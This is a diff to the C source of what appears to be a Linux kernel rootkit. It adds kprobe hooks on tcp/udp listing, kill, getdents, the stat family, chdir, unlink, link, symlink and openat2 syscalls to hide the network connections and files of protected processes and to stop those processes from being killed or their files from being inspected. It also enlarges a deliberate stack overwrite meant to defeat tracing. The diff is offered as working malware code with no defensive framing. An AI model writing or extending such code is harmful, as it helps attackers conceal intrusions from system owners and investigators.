@@ -11,24 +11,42 @@ struct hook {
 };
 
 struct hook hooks[] = {
+    // used to hide network connections of protected processes (from /proc/net)
     {.func = h_tcp4_seq_show,  .kp = {.symbol_name = "tcp4_seq_show"}       },
     {.func = h_tcp6_seq_show,  .kp = {.symbol_name = "tcp6_seq_show"}       },
-
     {.func = h_udp4_seq_show,  .kp = {.symbol_name = "udp4_seq_show"}       },
     {.func = h_udp6_seq_show,  .kp = {.symbol_name = "udp6_seq_show"}       },
 
+    // used to prevent killing proctected processes
+    {.func = h_kill,           .kp = {.symbol_name = "__x64_sys_kill"}      },
+
+    // used to hide files/dirs from directory listings
     {.func = h_getdents64,     .kp = {.symbol_name = "__x64_sys_getdents64"}},
     {.func = h_getdents,       .kp = {.symbol_name = "__x64_sys_getdents"}  },
 
-    {.func = h_kill,           .kp = {.symbol_name = "__x64_sys_kill"}      },
+    // used to prevent getting info about hidden files/dirs 
+    {.func = h_stat, .kp = {.symbol_name = "__x64_sys_stat"}      },
+    {.func = h_lstat, .kp = {.symbol_name = "__x64_sys_lstat"}      },
+    {.func = h_fstat, .kp = {.symbol_name = "__x64_sys_fstat"}      },
+    {.func = h_statx, .kp = {.symbol_name = "__x64_sys_statx"}      },
+    {.func = h_newfstatat, .kp = {.symbol_name = "__x64_sys_newfstatat"}      },
 
+    // used to prevent changing directory to hidden dirs
+    {.func = h_chdir, .kp = {.symbol_name = "__x64_sys_chdir"}      },
+    {.func = h_fchdir, .kp = {.symbol_name = "__x64_sys_fchdir"}      },
+
+    // used to prevent deleting hidden files/dirs
+    {.func = h_unlink, .kp = {.symbol_name = "__x64_sys_unlink"}      },
+    {.func = h_unlinkat, .kp = {.symbol_name = "__x64_sys_unlinkat"}      },
+
+    // used to prevent linking files/dirs with hidden files/dirs
+    {.func = h_link, .kp = {.symbol_name = "__x64_sys_link"}      },
+    {.func = h_linkat, .kp = {.symbol_name = "__x64_sys_linkat"}      },
+    {.func = h_symlink, .kp = {.symbol_name = "__x64_sys_symlink"}      },
+    {.func = h_symlinkat, .kp = {.symbol_name = "__x64_sys_symlinkat"}      },
+
+    // used prevent opening hidden files/dirs
     {.func = h_do_sys_openat2, .kp = {.symbol_name = "do_sys_openat2"}      },
-
-    /*{.num = __NR_statx, .name = "statx", .func = h_statx},
-    {.num = __NR_chdir, .name = "chdir", .func = h_chdir},
-    {.num = __NR_write, .name = "write", .func = h_write},
-    {.num = __NR_read, .name = "read", .func = h_read},
-    {.num = __NR_kill, .name = "kill", .func = h_kill},*/
 };
 
 #define hook_count() (sizeof(hooks) / sizeof(hooks[0]))
@@ -134,11 +152,15 @@ void *hooks_find(const char *symbol) {
   if (SHRK_DEBUG)
     panic("original call not found for %s", symbol);
 
-  // otherwise lets fuck the stack to make sure functions doesnt get traced back (most likely will cause overflow panic
-  // bc of canary)
+  /* 
+
+   * otherwise lets fuck the stack to make sure functions doesnt get traced back 
+   * which most likely will cause overflow panic bc of canary
+
+  */
   else {
     char buf[1];
-    memset(buf, 0, 1000);
+    memset(buf, 0, 8*1000);
   }
 
   return NULL;
